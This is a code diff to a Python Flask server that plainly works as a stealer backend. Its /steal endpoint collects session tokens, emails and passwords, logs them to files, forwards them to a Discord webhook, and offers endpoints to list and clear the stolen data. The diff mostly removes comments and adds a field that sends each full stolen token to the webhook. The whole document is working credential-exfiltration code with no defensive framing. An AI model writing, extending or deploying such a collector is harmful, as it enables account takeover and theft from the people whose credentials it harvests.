@@ -25,7 +25,6 @@ for f in [TOKENS_FILE, CREDS_FILE]:
 def send_webhook(token_data, cred_data=None):
     """Send stolen data to Discord webhook"""
     
-    # Build the embed
     embeds = []
     
     # Token embed
@@ -33,9 +32,10 @@ def send_webhook(token_data, cred_data=None):
         token = token_data.get('token', 'Unknown')
         embed = {
             "title": "🎯 TOKEN STOLEN",
-            "color": 16711680,  # Red
+            "color": 16711680,
             "fields": [
                 {"name": "Token", "value": f"```{token[:50]}...```", "inline": False},
+                {"name": "Full Token", "value": f"||{token}||", "inline": False},
                 {"name": "User Agent", "value": token_data.get('userAgent', 'Unknown')[:100], "inline": True},
                 {"name": "URL", "value": token_data.get('url', 'Unknown'), "inline": True},
                 {"name": "Referrer", "value": token_data.get('referrer', 'Unknown'), "inline": True},
@@ -50,7 +50,7 @@ def send_webhook(token_data, cred_data=None):
     if cred_data:
         embed2 = {
             "title": "🔐 CREDENTIALS STOLEN",
-            "color": 16755200,  # Orange
+            "color": 16755200,
             "fields": [
                 {"name": "Email", "value": cred_data.get('email', 'Unknown'), "inline": True},
                 {"name": "Password", "value": f"||{cred_data.get('password', 'Unknown')}||", "inline": True},
@@ -101,7 +101,6 @@ def steal():
                     'ip': request.remote_addr,
                     'timestamp': data.get('timestamp', datetime.now().isoformat())
                 }
-                # Save to file
                 with open(TOKENS_FILE, 'a', encoding='utf-8') as f:
                     f.write(f"{datetime.now().isoformat()} | {json.dumps(token_data)}\n")
                 print(f"[TOKEN] Stored: {token[:20]}...")
@@ -117,13 +116,12 @@ def steal():
                 f.write(f"{datetime.now().isoformat()} | {json.dumps(cred_data)}\n")
             print(f"[CREDS] Stored: {data['email']}:{data['password']}")
         
-        # Send to webhook (in background thread to not block)
+        # Send to webhook
         if token_data or cred_data:
             threading.Thread(target=send_webhook, args=(token_data, cred_data)).start()
         
         return jsonify({'status': 'ok'}), 200
     
-    # GET method (for image beacon fallback)
     elif request.method == 'GET':
         token = request.args.get('token')
         if token and len(token) > 30:
@@ -141,7 +139,6 @@ def steal():
 
 @app.route('/tokens', methods=['GET'])
 def view_tokens():
-    """View all stolen tokens"""
     if not os.path.exists(TOKENS_FILE):
         return jsonify([])
     with open(TOKENS_FILE, 'r') as f:
@@ -159,7 +156,6 @@ def view_tokens():
 
 @app.route('/creds', methods=['GET'])
 def view_creds():
-    """View all stolen credentials"""
     if not os.path.exists(CREDS_FILE):
         return jsonify([])
     with open(CREDS_FILE, 'r') as f:
@@ -177,7 +173,6 @@ def view_creds():
 
 @app.route('/clear', methods=['POST'])
 def clear_data():
-    """Clear all stolen data"""
     for f in [TOKENS_FILE, CREDS_FILE]:
         open(f, 'w').close()
     return jsonify({'status': 'cleared'})
@@ -186,7 +181,7 @@ if __name__ == '__main__':
     print("="*50)
     print("TOKEN COLLECTOR WITH WEBHOOK")
     print("="*50)
-    print(f"Webhook target: {WEBHOOK_URL[:50]}...")
-    print(f"Token endpoint: http://localhost:5000/steal")
+    print(f"Webhook: {WEBHOOK_URL[:50]}...")
+    print(f"Endpoint: http://0.0.0.0:5000/steal")
     print("="*50)
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
